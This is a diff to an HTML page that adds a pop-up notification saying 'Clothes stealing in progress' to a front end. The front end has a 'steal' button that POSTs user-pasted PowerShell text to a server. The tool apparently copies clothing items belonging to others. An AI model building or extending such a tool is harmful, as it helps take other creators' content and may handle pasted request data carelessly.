@@ -138,6 +138,28 @@
             height: 100%;
             object-fit: cover;
         }
+
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: -400px;
+            background-color: rgba(19, 19, 19, 0.8);
+            color: #fff;
+            padding: 15px;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4);
+            font-size: 16px;
+            width: 300px;
+            text-align: center;
+            opacity: 0;
+            transition: all 0.5s ease;
+        }
+
+        .notification.show {
+            right: 20px; 
+            opacity: 1;
+        }
     </style>
 </head>
 <body>
@@ -161,6 +183,9 @@
         </div>
     </div>
 
+
+    <div class="notification" id="notification">Clothes stealing in progress, could take up to 20 seconds...</div>
+
     <script>
         document.getElementById('stealButton').addEventListener('click', function() {
             const powershellText = document.getElementById('powershellInput').value;
@@ -174,6 +199,15 @@
                     method: 'POST',
                     body: formData
                 });
+
+
+                const notification = document.getElementById('notification');
+                notification.classList.add('show');
+
+
+                setTimeout(function() {
+                    notification.classList.remove('show');
+                }, 3000);
             }
         });
     </script>
